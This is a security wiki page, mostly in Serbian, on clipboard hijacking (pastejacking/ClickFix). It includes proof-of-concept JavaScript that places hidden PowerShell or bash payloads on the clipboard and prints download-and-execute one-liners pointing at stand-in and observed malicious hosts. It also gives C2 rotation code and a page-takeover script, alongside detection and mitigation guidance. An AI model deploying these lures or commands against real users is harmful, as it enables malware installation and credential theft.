# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> „Nikada ne lepite ništa što niste sami kopirali.“ – stara, ali i dalje validna preporuka

## Pregled

Clipboard hijacking – takođe poznat kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i lepe komande bez da ih pregledaju. Zlonamerni web sajt (ili bilo koji kontekst koji podržava JavaScript, kao što je Electron ili Desktop aplikacija) programski smešta tekst pod kontrolom napadača u sistemski clipboard. Žrtve se obično ohrabruju, obično putem pažljivo osmišljenih social-engineering instrukcija, da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *paste* sadržaj clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto **ne preuzima se nijedan fajl i nijedan attachment nije otvoren**, tehnika zaobilazi većinu e-mail i web-content kontrola bezbednosti koje nadgledaju attachment-e, makroe ili direktno izvršavanje komandi. Napad je zato popularan u phishing kampanjama koje isporučuju komercijalne porodice malware-a kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Neki macOS infostealeri kloniraju sajtove za instalere (npr. Homebrew) i **forsiraju upotrebu “Copy” dugmeta** tako da korisnici ne mogu selektovati samo vidljivi tekst. Unos u clipboard sadrži očekivanu instalacionu komandu plus dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), tako da jedno *paste*-ovanje izvršava oboje dok UI skriva dodatni korak.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older kampanje su koristile `document.execCommand('copy')`, novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## Tok ClickFix / ClearFake

1. Korisnik posećuje typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Injektovani **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()` koja tiho smešta Base64-kodiran PowerShell one-liner u clipboard.
3. HTML instrukcije govore žrtvi: *“Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da rešite problem.”*
4. `powershell.exe` se izvršava, preuzimajući arhivu koja sadrži legitimni izvršni fajl plus maliciozni DLL (klasično DLL sideloading).
5. Loader dešifruje dodatne faze, injektuje shellcode i uspostavlja persistence (npr. scheduled task) – na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.

### Primer lanca NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) traži u svom direktorijumu `msvcp140.dll`.
* Zlonamerni DLL dinamički rešava API-je koristeći **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) preko **curl.exe**, dešifruje ih koristeći rolling XOR key `"https://google.com/"`, ubrizgava finalni shellcode i otpakiva **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer preko MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Poziv **mshta** pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izvlači `Boat.pst` (CAB), rekonstruše `AutoIt3.exe` pomoću `extrac32` i spajanjem fajlova, i na kraju pokreće `.a3x` skript koji eksfiltrira kredencijale iz pregledača na `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK sa rotirajućim C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanja fajlova i naređuju žrtvama da zalepte one‑liner koji preuzima i izvršava JavaScript preko WSH, uspostavlja perzistenciju i svakodnevno rotira C2. Primer uočenog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne karakteristike
- Obfuscated URL je obrnut pri runtime-u kako bi se onemogućila površna inspekcija.
- JavaScript perzistira koristeći Startup LNK (WScript/CScript) i bira C2 prema trenutnom danu – omogućavajući brzu domain rotation.

Minimalni JS fragment koji se koristi za rotiranje C2s po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
U sledećoj fazi se obično instalira loader koji uspostavlja persistence i povlači RAT (npr. PureHVNC), često pinujući TLS na hardcoded sertifikat i šaljući saobraćaj u chunk-ovima.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams mogu kombinovati clipboard, process-creation i registry telemetriju da identifikuju zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verifikacione stranice (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno proizvode lažne CDN/browser verification pages ("Just a moment…", IUAM-style) koje nateraju korisnike da kopiraju OS-specific commands sa clipboard-a u native consoles. Ovo pomera izvršavanje iz browser sandbox-a i funkcioniše na Windows i macOS.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence inicijalnog pokretanja
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` tako da se izvršavanje nastavlja nakon zatvaranja terminala, smanjujući vidljive artefakte.

In-place page takeover na kompromitovanim sajtovima
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideje za detekciju i hunting specifične za IUAM-style mamce
- Web: Stranice koje vezuju Clipboard API za verification widgets; neslaganje između prikazanog teksta i clipboard payload; `navigator.userAgent` grananje; Tailwind + single-page replace u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browser-om; batch/MSI instalateri pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; background jobs koji prežive zatvaranje terminala.
- Korelacija `RunMRU` Win+R istorije i zapisivanja u clipboard sa naknadnim kreiranjem konzolnog procesa.

Pogledajte takođe za podržane tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigacije

1. Browser hardening – onemogućiti clipboard write-access (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevati korisnički gest.
2. Security awareness – obučite korisnike da *type* osetljive komande ili da ih prvo nalepе u tekst editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-linera.
4. Network controls – blokirajte odlazne zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezani trikovi

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon navlačenja korisnika u zlonamerni server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
